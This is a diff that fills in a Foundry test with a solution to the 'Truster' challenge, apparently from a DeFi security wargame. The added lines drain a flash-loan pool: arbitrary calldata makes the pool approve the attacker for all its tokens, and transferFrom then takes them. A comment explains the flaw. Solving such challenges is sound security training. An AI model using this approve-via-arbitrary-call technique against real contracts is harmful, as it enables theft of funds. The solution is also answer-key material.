@@ -38,6 +38,14 @@ contract Truster is Test {
     function testExploit() public {
         /** EXPLOIT START **/
 
+        // NOTE: Exploit is as a result of being able to pass any target contract and naked call it directly with any calldata
+        // This allows the attacker to approve the ERC20 to then drain from the lending pool. 
+
+        bytes memory data_ = abi.encodeWithSignature("approve(address,uint256)", attacker, TOKENS_IN_POOL);
+        trusterLenderPool.flashLoan(0, address(trusterLenderPool), address(dvt), data_);
+        vm.prank(attacker);
+        dvt.transferFrom(address(trusterLenderPool), attacker, TOKENS_IN_POOL);
+
         /** EXPLOIT END **/
         validation();
     }
